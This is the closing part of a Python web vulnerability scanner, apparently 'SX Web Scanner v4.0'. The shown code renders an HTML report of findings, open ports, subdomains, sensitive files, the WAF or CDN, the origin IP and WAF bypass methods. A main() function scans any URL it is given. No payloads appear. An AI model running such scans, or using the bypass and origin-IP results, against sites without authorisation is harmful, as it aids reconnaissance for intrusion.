                <div class="card-value severity-low">{by_severity.get('Low', 0)}</div>
            </div>
        </div>
        
        <div class="chart-container">
            <h3 style="margin-bottom: 20px;">Vulnerability Distribution by Category</h3>
            <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px;">
                {self._generate_category_chart(by_category)}
            </div>
        </div>
        
        <div class="vulnerability-section">
            <div class="section-title">
                Security Findings
            </div>
            
            {self._generate_vulnerability_html()}
        </div>
        
        <div class="chart-container">
            <h3 style="margin-bottom: 20px;">Scan Information</h3>
            <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px;">
                {self._generate_scan_info_html()}
            </div>
        </div>
        
        <div class="footer">
            <div>Generated by SX Web Scanner v4.0 - By Sx Team - By Sx Team</div>
            <div class="timestamp">
                Report generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} |
                Scan duration: {self._calculate_duration()}
            </div>
        </div>
    </div>
    
    <script>
        document.querySelectorAll('.vuln-header').forEach(header => {{
            header.addEventListener('click', () => {{
                const content = header.nextElementSibling;
                content.classList.toggle('active');
                
                const icon = header.querySelector('.toggle-icon');
                if (icon) {{
                    icon.textContent = content.classList.contains('active') ? '-' : '+';
                }}
            }});
        }});
        
        document.querySelectorAll('.vuln-header').forEach(header => {{
            const icon = document.createElement('span');
            icon.className = 'toggle-icon';
            icon.textContent = '+';
            icon.style.fontSize = '1.5rem';
            icon.style.fontWeight = 'bold';
            header.appendChild(icon);
        }});
    </script>
</body>
</html>
        '''
        
        return html

    def _get_score_class(self, score: int) -> str:
        if score >= 90:
            return "score-excellent"
        elif score >= 75:
            return "score-good"
        elif score >= 50:
            return "score-medium"
        elif score >= 25:
            return "score-poor"
        else:
            return "score-critical"

    def _generate_category_chart(self, by_category: Dict) -> str:
        if not by_category:
            return '<div style="color: var(--secondary); text-align: center; grid-column: 1 / -1;">No vulnerabilities found</div>'
        
        chart_html = ''
        colors = ['#0f62fe', '#1192e8', '#42be65', '#9ef0f0', '#ff832b', '#fa4d56', '#d12771', '#8a3ffc']
        
        for i, (category, count) in enumerate(sorted(by_category.items(), key=lambda x: x[1], reverse=True)):
            color = colors[i % len(colors)]
            percentage = (count / sum(by_category.values())) * 100
            
            chart_html += f'''
            <div style="margin-bottom: 15px;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                    <span>{category}</span>
                    <span style="font-weight: bold;">{count}</span>
                </div>
                <div style="height: 8px; background: var(--dark); border-radius: 4px; overflow: hidden;">
                    <div style="height: 100%; width: {percentage}%; background: {color}; border-radius: 4px;"></div>
                </div>
            </div>
            '''
        
        return chart_html

    def _generate_vulnerability_html(self) -> str:
        if not self.vulnerabilities:
            return '<div class="no-vulns">No vulnerabilities found!</div>'
        grouped = defaultdict(list)
        for vuln in self.vulnerabilities:
            grouped[vuln.severity].append(vuln)
        severity_order = ['Critical', 'High', 'Medium', 'Low', 'Info']
        html_parts = []
        for severity in severity_order:
            if severity in grouped:
                vulns = grouped[severity]
                for vuln in vulns:
                    severity_class = f"severity-{severity.lower()}-bg"
                    html_parts.append(f'''
                    <div class="vulnerability-item">
                        <div class="vuln-header">
                            <div class="vuln-title">{escape(vuln.title)}</div>
                            <div class="severity-badge {severity_class}">{vuln.severity}</div>
                        </div>
                        <div class="vuln-content">
                            <div class="vuln-detail">
                                <span class="detail-label">Description</span>
                                <div class="detail-value">{escape(vuln.description)}</div>
                            </div>
                            
                            <div class="vuln-detail">
                                <span class="detail-label">Endpoint</span>
                                <div class="detail-value">{escape(vuln.endpoint)}</div>
                            </div>
                            
                            <div class="vuln-detail">
                                <span class="detail-label">Proof</span>
                                <div class="detail-value">{escape(vuln.proof)}</div>
                            </div>
                            
                            <div class="vuln-detail">
                                <span class="detail-label">Technical Detail</span>
                                <div class="detail-value">{escape(vuln.technical_detail)}</div>
                            </div>
                            
                            <div class="vuln-detail">
                                <span class="detail-label">Remediation</span>
                                <div class="detail-value">{escape(vuln.remediation)}</div>
                            </div>
                            
                            <div class="vuln-detail">
                                <span class="detail-label">CVSS Score</span>
                                <div class="detail-value">{vuln.cvss_score}/10.0</div>
                            </div>
                        </div>
                    </div>
                    ''')
        
        return '\n'.join(html_parts)

    def _generate_scan_info_html(self) -> str:
        info_html = ''
        
        if 'frameworks' in self.results.information:
            frameworks = self.results.information['frameworks']
            if any(frameworks.values()):
                info_html += f'''
                <div>
                    <h4 style="margin-bottom: 10px; color: var(--primary);">Technologies Detected</h4>
                    <div style="background: var(--dark); padding: 15px; border-radius: 8px; border: 1px solid var(--border);">
                '''
                
                for key, value in frameworks.items():
                    if value:
                        if isinstance(value, list):
                            value_str = ', '.join(value) if value else 'None'
                        else:
                            value_str = str(value) if value else 'None'
                        
                        info_html += f'''
                        <div style="margin-bottom: 8px;">
                            <strong>{key.replace('_', ' ').title()}:</strong> {value_str}
                        </div>
                        '''
                
                info_html += '</div></div>'
        if hasattr(self, 'discovered_ports') and self.discovered_ports:
            info_html += f'''
            <div>
                <h4 style="margin-bottom: 10px; color: var(--primary);">Open Ports</h4>
                <div style="background: var(--dark); padding: 15px; border-radius: 8px; border: 1px solid var(--border);">
                    <div style="display: flex; flex-wrap: wrap; gap: 8px;">
            '''
            
            for port in sorted(self.discovered_ports):
                info_html += f'<span style="background: var(--card-bg); padding: 4px 8px; border-radius: 4px; border: 1px solid var(--border);">{port}</span>'
            
            info_html += '</div></div></div>'
        if hasattr(self, 'discovered_subdomains') and self.discovered_subdomains:
            info_html += f'''
            <div>
                <h4 style="margin-bottom: 10px; color: var(--primary);">Subdomains Found ({len(self.discovered_subdomains)})</h4>
                <div style="background: var(--dark); padding: 15px; border-radius: 8px; border: 1px solid var(--border); max-height: 200px; overflow-y: auto;">
            '''
            
            for subdomain in sorted(self.discovered_subdomains):
                info_html += f'<div style="padding: 4px 0; font-family: monospace; word-break: break-all;">{html.escape(subdomain)}</div>'
            
            info_html += '</div></div>'
        if 'subdomains' in self.results.information:
            subdomains_from_info = self.results.information['subdomains']
            if subdomains_from_info and isinstance(subdomains_from_info, list):
                info_html += f'''
                <div>
                    <h4 style="margin-bottom: 10px; color: var(--primary);">Subdomains from Enumeration ({len(subdomains_from_info)})</h4>
                    <div style="background: var(--dark); padding: 15px; border-radius: 8px; border: 1px solid var(--border); max-height: 200px; overflow-y: auto;">
                '''
                
                for subdomain in sorted(subdomains_from_info)[:20]:
                    info_html += f'<div style="padding: 4px 0; font-family: monospace; word-break: break-all;">{html.escape(str(subdomain))}</div>'
                
                if len(subdomains_from_info) > 20:
                    info_html += f'<div style="color: var(--secondary); padding: 4px 0;">... and {len(subdomains_from_info) - 20} more</div>'
                
                info_html += '</div></div>'
        if hasattr(self, 'discovered_files') and self.discovered_files:
            info_html += f'''
            <div>
                <h4 style="margin-bottom: 10px; color: var(--primary);">Sensitive Files Found ({len(self.discovered_files)})</h4>
                <div style="background: var(--dark); padding: 15px; border-radius: 8px; border: 1px solid var(--border); max-height: 200px; overflow-y: auto;">
            '''
            
            for file in sorted(self.discovered_files)[:20]:
                info_html += f'<div style="padding: 4px 0; font-family: monospace; word-break: break-all;">{html.escape(str(file))}</div>'
            
            if len(self.discovered_files) > 20:
                info_html += f'<div style="color: var(--secondary); padding: 4px 0;">... and {len(self.discovered_files) - 20} more</div>'
            
            info_html += '</div></div>'
        
        if 'cdn_waf' in self.results.information:
            cdn_waf = self.results.information['cdn_waf']
            if cdn_waf.get('cdn') or cdn_waf.get('waf'):
                info_html += f'''
                <div>
                    <h4 style="margin-bottom: 10px; color: var(--primary);">WAF/CDN Detection</h4>
                    <div style="background: var(--dark); padding: 15px; border-radius: 8px; border: 1px solid var(--border);">
                '''
                
                if cdn_waf.get('cdn'):
                    info_html += f'<div style="margin-bottom: 8px;"><strong>CDN:</strong> {cdn_waf["cdn"]}</div>'
                if cdn_waf.get('waf'):
                    info_html += f'<div style="margin-bottom: 8px;"><strong>WAF:</strong> {cdn_waf["waf"]}</div>'
                if cdn_waf.get('real_ip'):
                    info_html += f'<div style="margin-bottom: 8px;"><strong>Real IP:</strong> {cdn_waf["real_ip"]}</div>'
                
                if cdn_waf.get('bypass_methods'):
                    info_html += '<div style="margin-top: 10px;"><strong>Bypass Methods:</strong><ul style="margin-top: 5px; padding-left: 20px;">'
                    for method in cdn_waf['bypass_methods']:
                        info_html += f'<li style="margin-bottom: 4px;">{method}</li>'
                    info_html += '</ul></div>'
                
                info_html += '</div></div>'
        
        return info_html

    def _calculate_duration(self) -> str:
        try:
            start = datetime.fromisoformat(self.results.start_time)
            end = datetime.fromisoformat(self.results.end_time) if self.results.end_time else datetime.now()
            duration = end - start
            seconds = duration.total_seconds()
            
            if seconds < 60:
                return f"{int(seconds)} seconds"
            elif seconds < 3600:
                return f"{int(seconds // 60)} minutes {int(seconds % 60)} seconds"
            else:
                hours = int(seconds // 3600)
                minutes = int((seconds % 3600) // 60)
                return f"{hours} hours {minutes} minutes"
        except:
            return "Unknown"

async def main():
    print("SX Web Scanner v4.0 - By Sx Team - By Sx Team")
    print("=" * 50)
    
    target_url = input("Enter Target URL (e.g., http://example.com or just example.com): ").strip()
    
    if not target_url:
        print("No target URL provided. Exiting.")
        return
    if '.' not in target_url:
        print(f"Error: '{target_url}' doesn't look like a valid domain.")
        print("Please enter a valid domain like example.com or http://example.com")
        return
    if not target_url.startswith(('http://', 'https://')):
        print(f"Note: Adding http:// prefix to {target_url}")
        target_url = 'http://' + target_url
    print(f"Target URL: {target_url}")
    
    try:
        parsed = urlparse(target_url)
        if not parsed.netloc:
            print(f"Error: Could not extract domain from {target_url}")
            return
        
        print(f"Domain to scan: {parsed.netloc}")
        
        scan_config = ScanConfig(
            enable_business_logic=True,
            enable_api_fuzzing=True,
            enable_compliance=True,
            max_requests_per_second=5
        )
        
        scanner = SXWebScanner(
            target_url=target_url,
            scan_config=scan_config,
            max_concurrency=20,
            timeout=15,
            depth=2
        )
        
        print(f"Base domain extracted: {scanner.base_domain}")
        print("=" * 50)
        
        results = await scanner.scan("scan_report.html")
        
        print("\n" + "=" * 50)
        print("SCAN COMPLETED")
        print("=" * 50)
        
        print("\nScan Summary:")
        print(f"   Target: {results.get('target', 'N/A')}")
        print(f"   Security Score: {results.get('score', 0)}/100")
        print(f"   Risk Level: {results.get('risk_level', 'Unknown')}")
        print(f"   Vulnerabilities Found: {results.get('vulnerabilities_count', 0)}")
        
        if 'vulnerabilities' in results and results['vulnerabilities']:
            critical_vulns = [v for v in results['vulnerabilities'] if v.get('severity') in ['Critical', 'High']]
            if critical_vulns:
                print("\nCritical/High Vulnerabilities:")
                for vuln in critical_vulns:
                    print(f"   • {vuln.get('severity', 'Unknown')}: {vuln.get('title', 'N/A')}")
                    print(f"     Endpoint: {vuln.get('endpoint', 'N/A')}")
                    print(f"     CVSS: {vuln.get('cvss_score', 0)}/10.0")
            else:
                print("\nNo Critical/High vulnerabilities found.")
        else:
            print("\nNo vulnerabilities found or vulnerability data not available.")
        
        print(f"\nPayloads saved in: {scanner.payloads_dir}/")
        print("Report saved as: scan_report.html")
        print("All done! Check the HTML report for detailed findings.")
        
    except ValueError as e:
        print(f"\nError: {e}")
        print("Please check the URL format and try again.")
        return
    except Exception as e:
        print(f"\nUnexpected error: {e}")
        import traceback
        traceback.print_exc()
        return

def webrun():
    asyncio.run(main())

if __name__ == "__main__":
    asyncio.run(main())